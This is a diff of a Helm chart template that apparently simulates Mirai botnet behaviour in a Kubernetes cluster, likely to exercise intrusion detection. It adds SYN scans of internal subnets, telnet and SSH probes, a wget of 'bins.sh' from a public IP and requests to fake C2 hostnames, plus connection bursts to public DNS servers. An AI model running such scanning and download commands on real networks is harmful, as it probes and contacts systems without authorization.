@@ -1,4 +1,5 @@
-{{- if .Values.mirai.enabled -}}
+# Mirai Simulation Deployment
+{{- if .Values.mirai.enabled }}
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -31,20 +32,41 @@ spec:
       containers:
         - name: mirai
           image: {{ .Values.mirai.image }}
-          {{- if .Values.mirai.commandOverride }}
+          {{- if .Values.mirai.commandOverride }} # add commandOveride
           command: ["/bin/sh", "-c"]
           args:
             - |
-              echo "Starting Mirai simulation..."
-              apk add --no-cache iputils nmap
+              apk add --no-cache iputils nmap nmap-nping curl wget busybox-extras
+              echo "Starting Mirai botnet simulation..."
               while true; do
-                echo "Scanning for vulnerable devices (simulation)..."
-                # Simulate scanning local network
-                nmap -sn 10.0.0.0/24
-                # Simulate connection attempts
-                nc -zv 8.8.8.8 23 || true
-                nc -zv 8.8.8.8 22 || true
-                sleep {{ .Values.mirai.interval }};
+                # Phase 1: Network scanning (Mirai scans for vulnerable IoT devices)
+                echo "[$(date)] Scanning for vulnerable devices..."
+                nmap -sS -p 23,22,80,8080,5555,2323 10.0.0.0/24 2>/dev/null || true
+                nmap -sS -p 23,22,80,8080,5555,2323 10.42.0.0/24 2>/dev/null || true
+
+                # Phase 2: Telnet/SSH brute-force attempts
+                echo "[$(date)] Attempting telnet/SSH connections..."
+                for i in $(seq 1 20); do
+                  nc -zv -w 1 10.0.0.$i 23 2>&1 || true
+                  nc -zv -w 1 10.0.0.$i 22 2>&1 || true
+                  nc -zv -w 1 10.42.0.$i 23 2>&1 || true
+                done
+
+                # Phase 3: C2 communication (command and control)
+                echo "[$(date)] Communicating with C2 server..."
+                wget -q -O /dev/null http://185.244.25.0/bins.sh 2>&1 || true
+                curl -s http://cnc.mirai.botnet.invalid/report 2>&1 || true
+                nslookup report.mirai.botnet.invalid 2>/dev/null || true
+
+                # Phase 4: DDoS simulation (create SYN behavior)
+                echo "[$(date)] Simulating flood activity..."
+                for i in $(seq 1 10); do
+                  nc -zv -w 1 8.8.8.8 80 2>&1 || true
+                  nc -zv -w 1 8.8.4.4 443 2>&1 || true
+                done
+
+                echo "[$(date)] Cycle complete. Sleeping {{ .Values.mirai.interval }}s..."
+                sleep {{ .Values.mirai.interval }}
               done
           {{- end }}
 {{- end }}
